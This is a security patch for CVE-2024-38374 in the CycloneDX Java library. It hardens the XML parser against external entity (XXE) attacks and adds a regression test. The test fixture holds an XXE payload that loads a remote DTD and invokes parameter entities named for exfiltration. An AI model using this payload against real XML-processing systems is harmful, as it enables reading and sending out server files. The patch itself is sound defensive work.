@@ -1,0 +1,219 @@
+CVE: CVE-2024-38374
+upstream: https://github.com/CycloneDX/cyclonedx-core-java.git
+fix: ab0bc9c530d24f737970dbd0287d1190b129853d
+
+diff --git a/src/main/java/org/cyclonedx/parsers/XmlParser.java b/src/main/java/org/cyclonedx/parsers/XmlParser.java
+index a114984..119e5fd 100644
+--- a/src/main/java/org/cyclonedx/parsers/XmlParser.java
++++ b/src/main/java/org/cyclonedx/parsers/XmlParser.java
+@@ -24,21 +24,23 @@ import org.cyclonedx.CycloneDxSchema;
+ import org.cyclonedx.Version;
+ import org.cyclonedx.exception.ParseException;
+ import org.cyclonedx.model.Bom;
++import org.w3c.dom.Document;
++import org.w3c.dom.NamedNodeMap;
+ import org.w3c.dom.Node;
+ import org.w3c.dom.NodeList;
+ import org.xml.sax.ErrorHandler;
+ import org.xml.sax.InputSource;
+ import org.xml.sax.SAXException;
+ import org.xml.sax.SAXParseException;
++
++import javax.xml.XMLConstants;
++import javax.xml.parsers.DocumentBuilder;
++import javax.xml.parsers.DocumentBuilderFactory;
++import javax.xml.parsers.ParserConfigurationException;
+ import javax.xml.transform.Source;
+ import javax.xml.transform.stream.StreamSource;
+ import javax.xml.validation.Schema;
+ import javax.xml.validation.Validator;
+-import javax.xml.xpath.XPath;
+-import javax.xml.xpath.XPathConstants;
+-import javax.xml.xpath.XPathExpression;
+-import javax.xml.xpath.XPathExpressionException;
+-import javax.xml.xpath.XPathFactory;
+ import java.io.ByteArrayInputStream;
+ import java.io.File;
+ import java.io.IOException;
+@@ -46,8 +48,11 @@ import java.io.InputStream;
+ import java.io.Reader;
+ import java.lang.reflect.Field;
+ import java.nio.file.Files;
++import java.util.ArrayList;
++import java.util.HashMap;
+ import java.util.LinkedList;
+ import java.util.List;
++import java.util.Map;
+ 
+ /**
+  * XmlParser is responsible for validating and parsing CycloneDX bill-of-material
+@@ -63,16 +68,23 @@ public class XmlParser extends CycloneDxSchema implements Parser {
+         mapper = new XmlMapper();
+     }
+ 
++    private static final Map<String, String> NAMESPACE_TO_VERSION_MAP = new HashMap<>();
++
++    static {
++        for (Version version : Version.values()) {
++            NAMESPACE_TO_VERSION_MAP.put(version.getNamespace(), version.getVersionString());
++        }
++    }
++
+     /**
+      * {@inheritDoc}
+      */
+     public Bom parse(final File file) throws ParseException {
+         try {
+-            final String schemaVersion = identifySchemaVersion(
+-                extractAllNamespaceDeclarations(new InputSource(Files.newInputStream(file.toPath()))));
++            final String schemaVersion = identifySchemaVersion(new InputSource(Files.newInputStream(file.toPath())));
+ 
+             return injectSchemaVersion(mapper.readValue(file, Bom.class), schemaVersion);
+-        } catch (IOException | XPathExpressionException e) {
++        } catch (IOException | ParserConfigurationException | SAXException e) {
+             throw new ParseException(e);
+         }
+     }
+@@ -82,11 +94,10 @@ public class XmlParser extends CycloneDxSchema implements Parser {
+      */
+     public Bom parse(final byte[] bomBytes) throws ParseException {
+         try {
+-            final String schemaVersion = identifySchemaVersion(
+-                    extractAllNamespaceDeclarations(new InputSource(new ByteArrayInputStream(bomBytes))));
++            final String schemaVersion = identifySchemaVersion(new InputSource(new ByteArrayInputStream(bomBytes)));
+ 
+             return injectSchemaVersion(mapper.readValue(bomBytes, Bom.class), schemaVersion);
+-        } catch (IOException | XPathExpressionException e) {
++        } catch (IOException | ParserConfigurationException | SAXException e) {
+             throw new ParseException(e);
+         }
+     }
+@@ -278,22 +289,56 @@ public class XmlParser extends CycloneDxSchema implements Parser {
+         return validate(inputStream, schemaVersion).isEmpty();
+     }
+ 
+-    private String identifySchemaVersion(final NodeList nodeList) {
+-        for (int i=0; i<nodeList.getLength(); i++) {
+-            final Node node = nodeList.item(i);
+-            for (final Version version: Version.values()) {
+-                if (version.getNamespace().equals(node.getNodeValue()))  {
+-                    return version.getVersionString();
+-                }
++    private String identifySchemaVersion(final InputSource in)
++        throws ParserConfigurationException, IOException, SAXException
++    {
++
++        List<String> namespaces = extractAllNamespaceDeclarations(in);
++
++        for (String namespaceUri : namespaces) {
++            String versionString = NAMESPACE_TO_VERSION_MAP.get(namespaceUri);
++            if (versionString != null) {
++                return versionString;
+             }
+         }
+         return null;
+     }
+ 
+-    private NodeList extractAllNamespaceDeclarations(final InputSource in) throws XPathExpressionException {
+-        final XPathFactory xPathFactory = XPathFactory.newInstance();
+-        final XPath xPath = xPathFactory.newXPath();
+-        final XPathExpression xPathExpression = xPath.compile("//namespace::*");
+-        return (NodeList) xPathExpression.evaluate(in, XPathConstants.NODESET);
++    private List<String> extractAllNamespaceDeclarations(final InputSource in)
++        throws ParserConfigurationException, IOException, SAXException
++    {
++        Document doc = createSecureDocument(in);
++
++        // Extract all namespaces, including the default namespace
++        List<String>namespaces = new ArrayList<>();
++        extractNamespaces(doc.getDocumentElement(), namespaces);
++
++        return namespaces;
++    }
++
++    private void extractNamespaces(Node node, List<String> namespaces) {
++        if (node.getNodeType() == Node.ELEMENT_NODE) {
++            NamedNodeMap attributes = node.getAttributes();
++            for (int i = 0; i < attributes.getLength(); i++) {
++                Node attr = attributes.item(i);
++                if (attr.getNodeName().equals("xmlns")) {
++                    namespaces.add(attr.getNodeValue());
++                }
++            }
++        }
++        NodeList children = node.getChildNodes();
++        for (int i = 0; i < children.getLength(); i++) {
++            extractNamespaces(children.item(i), namespaces);
++        }
++    }
++
++    private Document createSecureDocument(InputSource in) throws ParserConfigurationException, IOException, SAXException
++    {
++        //https://cheatsheetseries.owasp.org/cheatsheets/XML_External_Entity_Prevention_Cheat_Sheet.html#xpathexpression
++        DocumentBuilderFactory df = DocumentBuilderFactory.newInstance();
++        df.setAttribute(XMLConstants.ACCESS_EXTERNAL_DTD, "");
++        df.setAttribute(XMLConstants.ACCESS_EXTERNAL_SCHEMA, "");
++        DocumentBuilder builder = df.newDocumentBuilder();
++        return builder.parse(in);
+     }
+ }
+diff --git a/src/test/java/org/cyclonedx/BomXmlGeneratorTest.java b/src/test/java/org/cyclonedx/BomXmlGeneratorTest.java
+index 726807d..f2fabeb 100644
+--- a/src/test/java/org/cyclonedx/BomXmlGeneratorTest.java
++++ b/src/test/java/org/cyclonedx/BomXmlGeneratorTest.java
+@@ -19,6 +19,7 @@
+ package org.cyclonedx;
+ 
+ import org.apache.commons.io.IOUtils;
++import org.cyclonedx.exception.ParseException;
+ import org.cyclonedx.generators.BomGeneratorFactory;
+ import org.cyclonedx.generators.json.BomJsonGenerator;
+ import org.cyclonedx.generators.xml.*;
+@@ -533,6 +534,13 @@ public class BomXmlGeneratorTest {
+         assertTrue(parser.isValid(loadedFile, version));
+     }
+ 
++    @Test
++    public void testXxeProtection() {
++        assertThrows(ParseException.class, () -> {
++            createCommonBomXml("/security/xxe-protection.xml");
++        });
++    }
++
+     @Test
+     public void testIssue408Regression_extensibleTypes() throws Exception {
+         Version version = Version.VERSION_15;
+diff --git a/src/test/resources/security/xxe-protection.xml b/src/test/resources/security/xxe-protection.xml
+new file mode 100644
+index 0000000..f91bdcb
+--- /dev/null
++++ b/src/test/resources/security/xxe-protection.xml
+@@ -0,0 +1,27 @@
++<?xml version="1.0" encoding="UTF-8"?>
++<!DOCTYPE bom [<!ENTITY % sp SYSTEM "https://localhost:1010/test/593ab443b77890d052e55899b16b61a8/raw/3cdd376bba0007145fa2bbacb9abe36cbd5a43ce/file.dtd"> %sp; %param1; %exfil;]>
++<bom xmlns="http://cyclonedx.org/schema/bom/1.5" serialNumber="urn:uuid:3e671687-395b-41f5-a30f-a58921a69b79">
++    <components>
++        <component type="application">
++            <name>Example Application &#x26;xxe;3</name>
++            <version>2.1.0</version>
++            <description>This is an example application</description>
++            <licenses>
++                <license>
++                    <id>Apache-2.0</id>
++                </license>
++            </licenses>
++            <purl>pkg:npm/example-app@2.1.0</purl>
++        </component>
++        <component type="library">
++            <name>Example Library</name>
++            <version>3.2.1</version>
++            <licenses>
++                <license>
++                    <id>MIT</id>
++                </license>
++            </licenses>
++            <purl>pkg:npm/example-lib@3.2.1</purl>
++        </component>
++    </components>
++</bom>
+\ No newline at end of file
